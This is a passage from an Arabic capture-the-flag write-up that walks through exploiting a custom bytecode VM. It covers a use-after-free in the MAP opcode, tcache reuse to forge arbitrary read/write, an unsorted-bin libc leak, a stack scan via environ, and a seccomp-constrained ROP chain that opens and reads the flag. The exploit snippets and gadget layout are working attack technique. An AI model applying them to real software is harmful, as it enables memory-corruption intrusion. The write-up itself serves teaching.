# LaanaScript VM — رحلتي الكاملة من أول سطر كود لين طلعت الـ Flag

بسم الله، خلوني اقول لكم وش صار بالضبط، خطوة خطوة، من أول ما فتحت الكود لين ما طلعت الفلاق. ما بفترض إنكم تعرفون أي شيء عن Heap ولا Stack ولا ROP من قبل - كل مفهوم بحاول ابسطه بأبسط صورة اقدر عليها، وبعدها نستخدمه.

---

## 1. وش هو هذا البرنامج أصلاً؟

البرنامج اسمه `laana`. لما شغّلته أول مرة، لقيت إنه مو برنامج عادي يسوي شي واحد ثابت — هو **آلة افتراضية** (يسمونها VM، اختصار Virtual Machine).

يعني وش الفرق؟ تخيل إنك تحط "كمبيوتر صغير وهمي" داخل البرنامج الأصلي، وهذا الكمبيوتر الصغير عنده أوامره الخاصة (زي push, add, jump...)، وأنت ترسل له "برنامج" مكتوب بالأوامر، وهو يقرأه وينفّذه وحدة وحدة.

فكرة الاستغلال هنا مختلفة عن أي pwn عادي: أنا ما استغل `laana` مباشرة بإي ادخال، أنا أكتب **برنامج صغير بلغة الـ VM نفسها**، وهذا البرنامج هو اللي يروح يستغل ثغرة داخل الـ VM ويطلعلي تحكم كامل.

### كيف أرسل له البرنامج؟

البرنامج ينتظر مني:
1. **4 بايتات** تقول له "برنامجي طوله كذا بايت" (مكتوبة بترتيب Big-Endian، يعني البايت الكبير أول شي).
2. وبعدها البايتات الفعلية لبرنامجي (bytecode).

```python
def framed(bytecode):
    return struct.pack(">I", len(bytecode)) + bytecode
```

بسيطة، بس لازم أنتبه لها وأنا أبني كل شي بعدين.

## 2. وش جوا الـ VM؟ (الذاكرة والبنية)

قبل ما أدور على ثغرة، لازم أفهم "بيت" هذا البرنامج من جوا — وش يخزن ووين.

```c
static uint64_t stk[STACKSZ];   // Stack حق الـ VM نفسها (مو ستاك المعالج)
static uint64_t glob[NGLOB];    // 64 خانة، كل وحدة تقدر تخزن فيها رقم
static Arr *arrs[NARR];         // جدول فيه 256 مصفوفة ممكنة
```

**إيش يعني "متغير عام" (`glob`)؟**
تخيله زي 64 درج رقمية مرقمة من 0 لين 63، كل درج تقدر تحط فيه رقم وتطلعه وقت ما تبي. البرنامج يستخدمها عشان يحفظ قيم بينها خطوات.

**إيش يعني "مصفوفة" (Array) هنا؟**
كل مصفوفة في الـ VM هي struct صغير اسمه `Arr`:

```c
typedef struct {
    uint64_t len;       // كم عنصر فيها فعلياً
    uint64_t cap;       // كم مساحة محجوزة لها
    uint64_t *data;      // مؤشر (pointer) يشير على مكان البيانات الحقيقية في الذاكرة
    uint64_t _pad[4];    // حشو فاضي، ما له استخدام فعلي
} Arr;
```

**وش معنى "مؤشر" (pointer)؟** هذا أهم مفهوم بكل القصة، فخلني أوضحه زين من البداية:
تخيل الذاكرة كأنها شارع طويل فيه بيوت مرقمة (العناوين). الـ "مؤشر" هو ورقة صغيرة مكتوب فيها رقم بيت — هو نفسه ما يحمل البيانات، بس يقولك "البيانات اللي تبيها موجودة في البيت رقم كذا". فلما أقول `data` يشير على مكان معين، يعني فيه ورقة مكتوب فيها عنوان، والبيانات الحقيقية موجوده في ذاك العنوان.

حجم الـ struct: `8+8+8+32 = 56 بايت = 0x38` بالـ hex. هذا الرقم بسيط الحين، بس وثقوه بيصير مهم قدام.

### كيف يتولد array جديد؟

```c
static uint64_t new_arr(uint64_t n) {
    Arr *a = malloc(sizeof(Arr));          // يحجز مكان لـ struct الـ Arr نفسها (56 بايت)
    a->len = n;
    a->cap = n;
    a->data = n ? malloc(n * 8) : NULL;    // يحجز مكان ثاني للبيانات الفعلية (n عنصر، كل عنصر 8 بايت)
    arrs[narr] = a;
    return narr++;                          // يرجع لي "رقم" (handle) أتعامل فيه مع هالمصفوفة
}
```

**وش معنى `malloc`؟** هذي دالة تقول للبرنامج "أبيك تحجزلي مكان في الذاكرة بهذا الحجم". المكان اللي تنحجز فيه يسمونه **Heap**. والـ Heap هو منطقة من الذاكرة مخصصة بالضبط لهالنوع من الحجوزات المتغيرة أثناء تشغيل البرنامج (عكس الـ Stack اللي يتكلم عنه بعدين، وهو منطقة ثانية مختلفة الغرض).

الحين شفتوا كيف؟ كل مصفوفة فعلياً تسوي **حجزين منفصلين**: وحد لـ struct نفسها (56 بايت)، ووحد للبيانات (`n*8` بايت). هذي النقطة بالذات هي أساس كل شي راح يصير بعدين.

### الأوامر اللي يفهمها الـ VM

فيه أوامر كثيرة (push, add, jump...)، بس اللي يهمني أركز عليه هنا اثنين:

```c
case OP_AGET: {   // اقرأ عنصر من مصفوفة
    uint64_t i = pop();
    Arr *a = geta(pop());
    if (i >= a->len) die("index out of range");   // ← فيه تحقق من الحدود!
    push(a->data[i]);
    break;
}
case OP_ASET: {   // اكتب عنصر في مصفوفة
    uint64_t v = pop(), i = pop();
    Arr *a = geta(pop());
    if (i >= a->len) die("index out of range");   // ← هذا كمان متحقق منه
    a->data[i] = v;
    break;
}
```

لاحظوا السطر `if (i >= a->len) die(...)`. هذا اسمه **bounds check** — يعني البرنامج يتأكد إنك ما تحاول توصل لعنصر خارج حدود المصفوفة. يعني عادي ما تقدر تكتب فوق حدود المصفوفة... إلا إذا قدرت بطريقة **تغيّر قيمة `len` نفسها** لرقم كبير. وهذي بالضبط النقطة اللي راح أوصلها.

## 3. اكتشاف الثغرة: أمر `OP_MAP`

وأنا أقرأ بقية الأوامر، وقفت عند هذا الكود:

```c
case OP_MAP: {
    uint32_t t; memcpy(&t, code + PC, 4); PC += 4;
    Arr *a = geta(pop());
    uint64_t n = a->len;              // ← ياخذ نسخة من len مرة وحدة بس
    uint64_t *d = a->data;            // ← ياخذ نسخة من مؤشر data مرة وحدة بس
    for (uint64_t i = 0; i < n; i++) {
        glob[NGLOB - 1] = d[i];
        push(i);
        cstk[csp++] = PC;
        PC = t;
        interp(csp);                  // ← ينفّذ "callback" (برنامج فرعي من كودي أنا)
        d[i] = pop();                 // ← يكتب النتيجة عن طريق نفس d القديم
    }
    break;
}
```

`MAP` معناه بسيط: "امشِ على كل عنصر في هالمصفوفة، وشغّل عليه دالة صغيرة (callback) أنا اللي أكتبها، وخذ الناتج واحفظه مكان العنصر". شي شبيه بفكرة موجودة بكثير لغات برمجة.

بس شوفوا وش صار: البرنامج ياخذ `n` (الطول) و`d` (مؤشر البيانات) **مرة واحدة فقط، قبل ما يبدأ الحلقة**. وبعدين داخل الحلقة، هو يشغل **كود أنا كاتبه** (الـ callback). يعني أنا أقدر أسوي داخل هالـ callback أي شي أبيه — حتى لو كان شي يغير المصفوفة نفسها وهي لسا جوا الحلقة!

**هنا بالضبط لقيت الثغرة.** لو الـ callback حقي سوى `resize` للمصفوفة (يعني طلب يغيّر حجمها)، فالبرنامج بيحرر `data` القديم ويحجز وحده جديد — لكن المتغير `d` اللي الحلقة شايلته من قبل **ما يتحدث**! باقي يأشر على المكان القديم، واللي صار الحين محرر (freed).

## 4. ليه هذي مشكلة؟ — شرح Use-After-Free (UAF) ببساطة

خلوني أشرح UAF بمثال من الحياة: تخيل عندك غرفة فندق محجوزة باسمك (رقم الغرفة = العنوان، محتوياتها = بياناتك). طلعت من الفندق وسلمت المفتاح (يعني "حررت" الغرفة، free). لكن ورقة صغيرة عندك لسا مكتوب فيها رقم الغرفة، وأنت تتعامل وكأنها لسا لك!

الفندق أعطى نفس الغرفة لزبون جديد (هذا اللي يسوي `malloc` لاحقاً). أنت، وانت ما تدري، ترجع تفتح الباب بورقتك القديمة وتبدأ تكتب أو تقرأ أغراض... بس هذي المرة الأغراض مو أغراضك، هي أغراض الزبون الجديد! هذا بالضبط معنى **Use-After-Free**: استخدام مؤشر (المفتاح/الورقة) بعد ما المكان اللي يأشر عليه صار محرر ومعطى لشخص/شي ثاني.

المشكلة في `OP_MAP`: مؤشر `d` هو "ورقتي القديمة"، وهو ما يتحدث حتى لو الغرفة (المكان في الذاكرة) تحررت وانعطت لحاجة ثانية.

لكن السؤال: **وش ممكن يسكن بالضبط في نفس المكان اللي تحرر؟** هذا يعتمد على كيف يدير الـ Heap نفسه الحجوزات — وهذا اللي بشرحه الحين.

## 5. كيف الـ Heap يعيد استخدام الأماكن (Tcache و Size Classes)

لما تطلب `malloc` بحجم معين، البرنامج ما يروح يبحث في كل الذاكرة من الصفر — عنده نظام تنظيم اسمه glibc allocator (نفس اللي ورا `malloc`/`free` في أغلب برامج اللينكس).

**الفكرة المهمة اللي تخصنا:** لما تسوي `free` لمساحة صغيرة، الـ allocator ما يرميها بعيد، هو يحطها في "سلة" (يسمونها **tcache bin**) مخصصة لمقاس قريب من مقاسها. ولما تطلب `malloc` بمقاس قريب بعدها، هو يرجع يعطيك **نفس المساحة اللي كانت محررة قبل شوي**، من نفس السلة، بدون ما يدور يمين يسار.

يعني: **لو حررت مساحة بمقاس X، وبعدها طلبت مساحة ثانية بنفس تقريباً مقاس X، فيه احتمال كبير جداً تاخذ نفس العنوان بالضبط.**

هذي هي السلاح اللي بستخدمه. نرجع لـ struct الـ `Arr`:

قبل ما أحسب، لازم أعرف كيف الـ allocator يحول "حجم الطلب" إلى "حجم chunk فعلي": هو يضيف تقريباً 8 بايت لحقل داخلي خاص فيه (يستخدمه لتتبّع حجم الـ chunk)، وبعدين يرفع الناتج لأقرب مضاعف 16 بايت (محاذاة). يعني الصيغة التقريبية: `chunk_size ≈ round_up_16(request_size + 8)`.

- حجم `Arr` نفسه = `56 بايت`. نطبق الصيغة: `56 + 8 = 64`، وهذا أصلاً مضاعف 16 → **chunk size = 0x40**.
- لو طلبت مصفوفة بـ `n = 6` عناصر، فالبيانات حجمها `6 * 8 = 48 بايت`. نطبق الصيغة: `48 + 8 = 56`، وهذا مو مضاعف 16، فيرفعه الـ allocator لأقرب مضاعف وهو `64` → **برضو chunk size = 0x40**!

**نفس فئة الحجم بالضبط (0x40)**، حتى لو كان حجم الطلب الأصلي مختلف (56 مقابل 48). يعني لو حررت `data` تبع مصفوفة فيها 6 عناصر، وبعدها طلبت `new_arr` جديدة، فـ `malloc(sizeof(Arr))` حق المصفوفة الجديدة بيرجع **يسكن بنفس المكان اللي تحرر توه**، لأن الاثنين كلهم بنفس فئة الـ tcache

وهذي بالضبط فخ الثغرة: لما الـ `data` القديم يتحرر داخل الـ callback، وبعدها أسوي `new_arr(6)` على طول رأس المصفوفة الجديدة يروح يسكن **بالضبط وين كان `d` (المؤشر القديم) يأشر عليه**. وبما إن الحلقة لسا شغالة وما تحدثت `d`، فـ `d[0], d[1], d[2]` الحين صارت تكتب **فوق `len`, `cap`, `data` حق المصفوفة الجديدة**!

خلوني أرسمها عشان تتضح أكثر — هذا هو نفس مكان الذاكرة (نفس العنوان) بالضبط، بس في ثلاث لحظات مختلفة:

```
اللحظة 1 — قبل الـ callback (X عادي، 6 عناصر):
  العنوان A:  [ بيانات X: 8 بايت × 6 عناصر ]   ← d يأشر هنا
                                                   n (الطول المحفوظ) = 6

اللحظة 2 — داخل الـ callback، بعد ARESIZE(X, 0x200):
  العنوان A:  [ ...تحرر... ]   ← صار "فاضي" ورجع لسلة الحجوزات (tcache)
              الـ data الجديد لـ X انتقل لعنوان ثاني (B) بحجم أكبر

اللحظة 3 — بعد new_arr(6) مباشرة (نفس الـ callback):
  العنوان A:  [ len | cap | data | pad[4] ]   ← هذا رأس الـ Arr الجديد (g7)!
              بس d (المؤشر القديم تبع الحلقة) **لسا يأشر على العنوان A نفسه**

  رجوع الحلقة لسطر "d[i] = pop()":
    d[0] = قيمة   ───▶ يكتب فوق   len   (أول 8 بايت من العنوان A)
    d[1] = قيمة   ───▶ يكتب فوق   cap   (ثاني 8 بايت)
    d[2] = قيمة   ───▶ يكتب فوق   data  ← هذا العلم الزين! صار يأشر على أي عنوان أبيه
    d[3..5]        ───▶ يكتب فوق   pad[4] (حشو، ما يهمنا)
```

يعني المؤشر `d` ما "تحرك" من مكانه مره — اللي تحرك هو **معنى** الشي الجالس في ذاك المكان، من "بيانات X القديمة" إلى "رأس هيكلة Arr جديدة بالكامل تحت يدي".

يعني أقدر، بثلاث كتابات بس، أخلي أي "handle" (رقم مصفوفة) في الـ VM يصير `len` و`cap` اللي أبيهم، و`data` يأشر على **أي عنوان أختاره أنا داخل مساحة عنونة العملية (process address space)**. من هنا بنيت:

- `AGET` على هالـ handle = **primitive قراءة موجّهة (read primitive)**: أقدر أوجه القراءة لأي عنوان أختاره.
- `ASET` على هالـ handle = **primitive كتابة موجّهة (write primitive)**: أقدر أوجه الكتابة لأي عنوان أختاره.

**تنويه يبشوات (مهم):** هذا مو "تحكم سحري بكل الذاكرة بدون حدود" — هو primitive يخليني أوجه القراءة/الكتابة لأي عنوان *أنا أحسبه مسبقاً وأعرف إنه صالح* (زي عناوين جوا الـ libc أو الـ Stack اللي سربتها). لو وجهت `AGET/ASET` لعنوان غير مخصص أو خارج صلاحيات العملية، البرنامج بينهار (segfault)( النيكنيم XD ). زي أي وصول غير شرعي عادي — لأن العملية نفسها فيها قيود نظام التشغيل الطبيعية (صلاحيات الصفحات، حدود الـ address space...). قوة هالثغرة إنها تخليني أختار **أي عنوان أبيه ضمن هالمساحة**، مو إنها تكسر حدود الذاكرة الأساسية للنظام.

### كيف طبقت هذا عملياً

كتبت دالة صغيرة اسمها `mk_uaf`، تسوي array اسمه X بـ 6 عناصر، وتشتغللل عليها `MAP` بـ callback خاص. الـ callback عندي يفحص رقم التكرار (`g60`) ويسوي:

| التكرار | وش يصير |
|---|---|
| 0 | يسوي `ARESIZE` على X (يحرر الـ data القديم بحجم 0x40)، وبنفس اللحظة يسوي `new_arr(6)` جديد — هذا الجديد ياخذ نفس المكان المحرر. يرجع القيمة اللي أبيها تصير `len` |
| 1 | يرجع القيمة اللي أبيها تصير `cap` |
| 2 | يرجع العنوان اللي أبي المصفوفة تشاور عليه (`data`) |
| 3,4,5 | يرجع أصفار (حشو) |

بعد ما تخلص الحلقة، صار عندي array (رقمه محفوظ في `g7`) طوله وحجمه وعنوانه اللي أبيهم بالضبط. من هذي اللحظة، `AGET(g7, i)` و `ASET(g7, i, v)` صارت توجه القراءة/الكتابة **للعنوان اللي أنا حددته في `g8`**.

## 6. طيب ليش أحتاج أعرف عنوان الـ libc ؟

**وش هي الـ libc؟** هي مكتبة أساسية موجودة في كل برنامج لينكس، فيها دوال جاهزة زي `malloc`, `printf`, `open`... البرنامج `laana` نفسه مبني فوقها ويستخدم دواله.

**ليش أحتاجها؟** عشان فيه حماية اسمها **ASLR**، كل مرة يشتغل البرنامج، مكان تحميل الـ libc في الذاكرة يتغير عشوائياً. يعني حتى لو عرفت إن فيه دالة معينة جوا الـ libc أبيها، ما أقدر أعرف عنوانها الحقيقي إلا إذا عرفت "نقطة انطلاق" وحدة بالضبط من داخل هالـ libc في هذا التشغيل بالذات. لما أعرف نقطة وحدة، أقدر أحسب أي عنوان ثاني داخلهاا (لأن المسافات بين الدوال داخل نفس نسخة الـ libc دايماً ثابتة، بس "القاعدة" اللي يبنى عليها الحساب هي اللي تتغير).

> **تنويه ثاني مهم (بنطبق على كل الإزاحات الجاية: `LIBC_UNSORTED`, `LIBC_ENVIRON`, `LIBC_MAIN_RET`, وكل الـ gadgets):**
> كل هذه الأرقام (`0x1e9b20`, `0x1f0e28`, `0x29f77`، وعناوين الـ gadgets زي `POP_RDI`...) هي إزاحات **خاصة ببناء وإصدار الـ libc المعطى بالضبط لي هذه التحدي** (نفس ملف `libc.so.6` الي عندكم). هي **مو ثابتة عبر كل إصدارات glibc** — حتى تغيير بسيط في نسخة التوزيعة (Debian/Ubuntu مختلفة) أو رقم إصدار glibc يقدر يغير هالإزاحات بالكامل. يعني لو حد يبي يطبق نفس فكرة الاستغلال على نسخة libc ثانية، **لازم يعيد استخراج كل هالإزاحات من جديد** (عن طريق أدوات زي `pwntools`/`ROPgadget` على نسخة الـ libc الصحيحة)، وما يصح ينسخها مباشرة من الـ writeup ويحسب انها بتشتغل على أي بيئة.

### تسريب العنوان: Unsorted Bin Leak

رجعت لموضوع الـ heap. قلت فوق إن الحجوزات الصغيرة تروح لسلة اسمها tcache. بس الـ tcache نفسه له **حد أقصى**، وهنا لازم أفرق بين شيئين عشان ما يصير لخبطة:

- **حجم الطلب (request size):** هذا الرقم اللي أنا أمرره لـ `malloc(n)` (أو هنا `ARESIZE`) — يعني "أبي كذا بايت بيانات فعلية".
- **حجم الـ chunk (chunk size):** هذا الحجم الحقيقي اللي يحجزه الـ allocator فعلياً، وهو حجم الطلب بعد ما يرفعه لأقرب محاذاة (عادةً من مضاعف 16 بايت) **زائد رأس صغير (header) للـ allocator نفسه (8 بايت)**. يعني دايماً `chunk size > request size` بشويي.

الحد الأقصى لسلة tcache (في النسخة المعطاة لنا من glibc) معرف على أساس **حجم الـ chunk**، مو حجم الطلب مباشرة. القيمة الشائعة لهالحد في إعدادات glibc الافتراضية هي `0x410` (كحجم chunk)، وهذا الرقم خاص بإعداد الـ allocator نفسه، ما هو مكتوب صراحة في `laana.c` ولا `laana_xpl.py` — فخذوه كمعلومة عامة عن glibc، مو كلشي تحققت منه من ملفات التحدي مباشرة. المهم عملياً إن حجز `g0` (0x200 عنصر × 8 بايت = 0x1000 بايت بيانات) ينتج chunk بحجم أكبر بكثير من أي حد معقول للـ tcache، فهو **أكيد** بيروح للسلة الثانية:

```
حجم الـ chunk  ≤ حد الـ tcache   ───▶  يروح لسلة  tcache  (سريعة، تعيد مباشرة بنفس الترتيب)
حجم الـ chunk  >  حد الـ tcache   ───▶  يروح لسلة  unsorted bin  (طبعاً مختلفة مره في السلوك)
```

وهذي ("unsorted bin") بالضبط الحالة اللي أبيها — لأن سلوكها مختلف بشكل يفيدني.

**الفرق المهم:** داخل الـ unsorted bin، الـ allocator يكتب داخل أول 8 بايت من المساحة المحررة **مؤشر يأشر على مكان جوا الـ libc نفسها** (جزء من هيكلة إدارة الذاكرة الداخلية، اسمه `main_arena`). يعني لو قدرت أقرأ أول 8 بايت من مساحة محررة وواقعة في الـ unsorted bin، بأحصل على عنوان حقيقي داخل الـ libc!

```python
a.push(0x200).newarr().storeg(0)     # g0: مصفوفة كبيرة (0x200 عنصر → حجز 0x1000+8 بايت)
a.push(1).newarr().storeg(1)         # g1: مصفوفة صغيرة، تستخدم كـ "حاجز" (guard)
a.push(0).newarr().storeg(2)         # g2: رأس بدون بيانات (data = NULL) محجوز من قبل
a.loadg(0).push(0).aresize()         # حرر data حق g0 → يروح للـ unsorted bin
a.loadg(2).push(0x200).aresize()     # realloc(NULL, نفس الحجم) على g2 → ياخذ نفس المكان من الـ unsorted bin
a.loadg(2).push(0).aget()            # اقرأ أول qword = عنوان جوا الـ libc (main_arena+96)
a.push(LIBC_UNSORTED).sub().storeg(3)  # اطرح الإزاحة المعروفة مسبقاً → يطلع libc base!
```

**ليش أحتاج `g1` (الحاجز)؟** لو ما حطيته، فالمساحة الكبيرة اللي حررتها تكون ملاصقة لآخر منطقة الـ heap (اسمها top chunk)، والـ allocator تلقائياً "يدمجها" رجوع بالـ top بدل ما يحطها في الـ unsorted bin — فأخسر الـ leak. الحاجز عبارة عن مصفوفة صغيرة أحطها بينهم عشان تمنع هذا الدمج.

**ليش أحجز `g2` (الرأس الفاضي) من قبل؟** لو انتظرت وطلبت `new_arr` جديدة بعد التحرير مباشرة، فالحجز الأول اللي بيصير (رأس الـ Arr، 0x40 بايت) ممكن ياخذ جزء بسيط من نفس المساحة الكبيرة المحررة ويقسّمها — فتختلط البيانات وأخسر أول 8 بايت اللي أبيهم. لما أحجز `g2` من الأول (بدون بيانات)، وبعدين أسوي له `resize` بنفس الحجم بالضبط، فهو ياخذ المساحة كاملة زي ما هي، بدون تقسيم، والـ 8 بايت اللي أبيها تضل سليمة.

هذا ملخص الرحلة كاملة لنفس المساحة، من التحرير لين التسريب:

```
g0 (0x200 عنصر) ──free──▶  unsorted bin  [ fd=main_arena+96 | bk=main_arena+96 | ...بيانات قديمة... ]
                                 │
                                 │  g2.ARESIZE(0x200) = realloc(NULL, نفس المقاس بالضبط)
                                 ▼
g2 الآن يملك نفس المساحة، وأول 8 بايت منها لسا فيها القيمة اللي كتبها الـ allocator:

   AGET(g2, 0) = main_arena + 96   (قيمة حقيقية جوا الـ libc)
   libc_base = (main_arena + 96) − LIBC_UNSORTED
```

## 7. القفزة من الـ libc إلى الـ Stack — عبر `environ`

الحين عندي `g3` = عنوان بداية الـ libc في هالتشغيل. بس أنا مو بس أبغى أعرف الـ libc، أبي أوصل لـ **الـ Stack**.

**وش هو الـ Stack؟** هذي منطقة ثانية من الذاكرة (مختلفة عن الـ Heap)، تستخدمها البرامج عشان تحفظ فيها أشياء مؤقتة أثناء تنفيذ الدوال — أهمها **عنوان العودة** (saved return address، أو كما يسمونه saved RIP). يعني لما دالة `A` تنادي دالة `B`، البرنامج يحفظ في الـ Stack "لما تخلص B، ارجع واكمل من هالسطر بالضبط في A". هذا العنوان هو اللي راح أستهدفه بعدين.

لكن كيف أوصل من الـ libc للـ Stack؟ الـ libc عندها متغير عام اسمه `environ`، وهو مؤشر يأشر على أول عنصر في مصفوفة متغيرات البيئة (environment variables) — وهذي المصفوفة موجودة **على الـ Stack نفسها**! يعني `environ` هو "جسر" بين الـ libc والـ Stack.

```python
a.loadg(3).push(LIBC_ENVIRON).add().storeg(8)   # g8 = عنوان environ (libc_base + إزاحة معروفة)
a.push(0x100).storeg(9)                         # g9 = طول القراءة
a.call('mk_uaf')                                # استخدم نفس سلاح الـ arbitrary read/write
a.loadg(7).push(0).aget().storeg(4)             # g4 = قيمة environ = عنوان على الـ Stack!
```

ببساطة: استخدمت نفس "السلاح" اللي بنيته فوق (الـ arbitrary read primitive)، بس هالمرة وجههته على عنوان `environ` بدل عنوان عشوائي، فقريت القيمة المخزنة فيه، وطلعت لي عنوان حقيقي داخل الـ Stack.

## 8. البحث عن `saved RIP` (عنوان العودة)

عندي الحين عنوان **تقريبي** على الـ Stack (بداية environment). بس أبي بالضبط العنوان اللي فيه **saved RIP لدالة main** (يعني العنوان اللي البرنامج بيقفز له لما `main` ترجع).

هنا لازم أفرق بين شيئين مهمين:

- **`LIBC_MAIN_RET = 0x29f77`** هذا رقم ثابت — إزاحة (offset) داخل ملف الـ libc نفسه، مأخوذ مباشرة من ثوابت الاستغلال (`laana_xpl.py`). هذا الرقم **لا يتغيّر** بين كل تشغيل للبرنامج (طالما نفس نسخة/بناء الـ libc)، لأنه جزء من محتوى ملف الـ libc على القرص.
- **العنوان الفعلي أثناء التشغيل** = `libc_base + 0x29f77`، و`libc_base` هو اللي يتغيّر عشوائياً كل مرة (بسبب ASLR) — وهذا اللي قدرت أحسبه فوق من الـ unsorted bin leak.

يعني أنا ما أقارن بـ "رقم ثابت" في الذاكرة، أقارن بـ "رقم ثابت + القاعدة اللي عرفتها توي"، وهذا اللي يخلي السكريبت يشتغل بغض النظر عن ASLR في أي تشغيل جديد.

**تنويه مهم:** هالتحقق خاص **بنفس نسخة `libc.so.6` المرفقة هنا فقط** — ولو كان عندك نسخة libc مختلفة (حتى لو قريبة بالرقم)، لازم تعيد نفس خطوة التفكيك على نسختك أنت قبل ما تثق بالرقم، لأنه مو ثابت عبر كل إصدارات glibc (زي ما نبّهت فوق في قسم 6).

الحل: أسوي "مسح" (scan) بسيط — أقرأ qword وحده وحده في منطقة واسعة تحت `environ`، وأقارن كل وحدة بالقيمة اللي أتوقعها:

```python
a.loadg(4).push(0x1000).sub().storeg(8)   # ابدأ البحث من 0x1000 بايت تحت environ
a.push(0x400).storeg(9)                   # امسح 0x400 خانة (0x2000 بايت)
a.call('mk_uaf')                          # ثبّت primitive القراءة على هالمنطقة

# حلقة scan:
# لكل i من 0 إلى 0x400:
#     إذا AGET(g7, i) == libc_base + 0x29f77:
#         g12 = العنوان الحقيقي لهالخانة  ← هذا هو مكان saved RIP!
```

لما ألقى القيمة المتطابقة، أكون عرفت **العنوان الدقيق** اللي لو كتبت فيه، البرنامج بيقفز له بمجرد ما `main` ترجع. هذا هو هدفي التالي.

## 9. بناء سلسلة ROP (ROP Chain)

### وش هو ROP؟ ليش نحتاجه أصلاً؟

عادةً، أبسط طريقة تاخذ تحكم كامل ببرنامج هي تكتب كود خاص بك (shellcode) وتخليه يشتغل. بس أغلب الأنظمة الحديثة تمنع تنفيذ كود مكتوب حديثاً على الـ Stack أو الـ Heap (حماية تمنع التنفيذ). فبدل ما أكتب كود جديد، أستخدم **أكواد موجودة أصلاً جوا الـ libc نفسها** (لأنها مسموح تنفيذها)، وأرتّبها بالترتيب اللي أبيه.

تخيلها زي لعبة ليغو: الـ libc فيها آلاف "القطع الصغيرة" الجاهزة (كل قطعة كود صغير جداً، ينتهي بأمر `ret` يرجع يقرأ القطعة التالية من مكان أحدده أنا). أنا بس أرتّب هالقطع على الـ Stack بالترتيب الصح، وكل وحدة تسلّم الثانية.

كل قطعة من هذي يسمونها **gadget**. مثلاً `POP_RDI` هو قطعة كود صغيرة وظيفتها بس "خذ القيمة اللي فوق الـ Stack وحطها في سجل اسمه RDI، وبعدين ارجع للقطعة اللي بعدها".

**نقطة مهمة لازم توضح هنا، لأنها غالطة في كثير شروحات:** فيه اتفاقيتين مختلفتين على لينكس x86_64، ولازم ما نخلطهم:

1. **اتفاقية استدعاء دوال C العادية (System V AMD64 Calling Convention)** — اللي تستخدمها دوال زي `snprintf` أو دالة `syscall()` نفسها حقت الـ libc: أول 6 معاملات تنحط بالترتيب في `RDI, RSI, RDX, RCX, R8, R9`.
2. **اتفاقية الـ raw syscall نفسها (Linux x86_64 Syscall Convention)** — اللي تستخدم لما تنفّذ تعليمة `syscall` مباشرة (زي ما سويت بالـ gadget `SYSCALL`): رقم الاستدعاء يروح في `RAX`، والمعاملات بالترتيب في `RDI, RSI, RDX, R10, R8, R9`.

**لاحظوا الفرق: المعامل الرابع في الـ raw syscall يروح `R10`، مو `RCX`!** السبب: تعليمة `syscall` نفسها تستخدم `RCX` داخلياً لحفظ عنوان العودة (و`R11` لحفظ الـ flags)، فما تقدر تستخدم `RCX` كمعامل حقيقي للاستدعاء. لهالسبب بالضبط صمم كيرنل لينكس الاتفاقية تستخدم `R10` بدلها.

في الاستغلال اللي سويته، كل الـ raw syscalls اللي نفّذتها مباشرة (`open`, `getdents64`, `read`, `write`, `exit`) ما احتاجت أكثر من 3 معاملات حقيقية (`RDI, RSI, RDX`)، فما وصلت أصلاً لحالة تحتاج `R10`.

### كيف أكتب السلسلة؟

بما إني عندي arbitrary write primitive (من فوق)، أكتب كل gadget وقيمة (الـ chain كله) **فوق مكان saved RIP اللي لقيته**، وحده بعد وحده:

```python
def aset(idx, v):
    a.loadg(7).loadg(11).push(idx).add()   # index = g11 (مكان saved RIP) + idx
    pushx(v)
    a.aset()
```

وجهّزت دالة بايثون صغيرة سميتها `syscall()` (انتبهوا: هذا اسم دالة من عندي بالسكربت، مختلف عن دالة `syscall()` الحقيقية حق الـ libc اللي بنشرحها بعدين) تبني لي raw syscall بترتيب المعاملات الصح حسب اتفاقية الكيرنل (`RDI, RSI, RDX, RAX`):

```python
def syscall(nr, rdi, rsi=0, rdx=0):
    gadget(POP_RDI); val(rdi)
    gadget(POP_RSI); val(rsi)
    gadget(POP_RDX); val(rdx)
    gadget(POP_RAX); val(nr)
    gadget(SYSCALL)
```

### شكل السلسلة فوق الـ Stack

عشان تتضح الصورة أكثر، هذا شكل أول استدعاء (`open`) بعد ما يصير مكتوب فوق مكان الـ saved RIP. كل صف هو 8 بايت (qword وحد)، والـ CPU يمشي من فوق لتحت، كل قطعة توصل اللي بعدها:

```
عنوان saved RIP (g12) ──────────────────────────────▶  ينفّذ من هنا بعد ما main ترجع
┌─────────────────────────────────────────┐
│  g12 + 0x00  →  gadget: POP_RDI ; ret    │ ◀── أول شي ينفّذ
│  g12 + 0x08  →  القيمة: عنوان "/home/ctf"│     (تُسحب داخل RDI)
│  g12 + 0x10  →  gadget: POP_RSI ; ret    │
│  g12 + 0x18  →  القيمة: 0x10000 (O_DIRECTORY)│ (تُسحب داخل RSI)
│  g12 + 0x20  →  gadget: POP_RDX ; ret    │
│  g12 + 0x28  →  القيمة: 0                │ (تُسحب داخل RDX)
│  g12 + 0x30  →  gadget: POP_RAX ; ret    │
│  g12 + 0x38  →  القيمة: 2 (رقم open)     │ (تُسحب داخل RAX)
│  g12 + 0x40  →  gadget: SYSCALL          │ ◀── ينفّذ open() فعلياً، fd=3
│  g12 + 0x48  →  ...تكملة سلسلة getdents64 بنفس الطريقة...│
└─────────────────────────────────────────┘
```

كل `gadget` بعد ما يسوي شغلته (pop قيمة لسجل)، آخر تعليمة فيه هي `ret` — وهذي بالضبط اللي تخليه "يقفز" ويقرأ القطعة التالية من الـ Stack، وكذا نكمل السلسلة كلها بدون ما نحتاج ننفّذ أي كود جديد، كله أكواد أصلية من الـ libc.

## 10. عقبة: الـ seccomp — ليش ما أقدر أفتح شِل؟

**وش هو seccomp؟** هذا نظام حماية موجود في لينكس يقدر البرنامج يفعّله على نفسه، ليحدد **بالضبط أي استدعاءات نظام (syscalls) مسموح له يستخدمها**، وأي استدعاء ثاني يقتل البرنامج فوراً.

فحصت الكود ولقيت `laana` يفعّل seccomp يسمح بس بـ:

```
read, write, open, openat, close, getdents64, lseek,
fstat, newfstatat, exit, exit_group, brk, mmap, munmap
```

يعني **ما فيه `execve`** (الاستدعاء اللي يشغّل برنامج/شِل جديد زي `/bin/sh`). هذا يقفل الطريقة المعتادة اللي أغلب pwners يفكرون فيها أول شي (فتح شِل). لازم أفكر بطريقة ثانية: بما إن `open`, `read`, `write` مسموحين، هدفي يصير **أفتح ملف الفلاق وأقرأه وأطبعه على الشاشة** مباشرة — بدون ما أحتاج شِل أصلاً.

### عقبة ثانية: اسم ملف الفلاق عشوائي!

